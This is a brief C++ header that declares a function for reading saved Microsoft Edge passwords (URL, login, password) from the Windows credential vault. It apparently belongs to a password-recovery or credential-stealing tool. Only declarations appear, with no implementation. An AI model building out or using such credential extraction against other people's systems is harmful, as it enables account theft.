#pragma once
#define VAULT_ENUMERATE_ALL_ITEMS 512

namespace EdgeData {
	struct PassData
	{
		string Url;
		string Login;
		string Pass;
	};
}

namespace Edge
{
	vector<EdgeData::PassData> GetPasswords();
}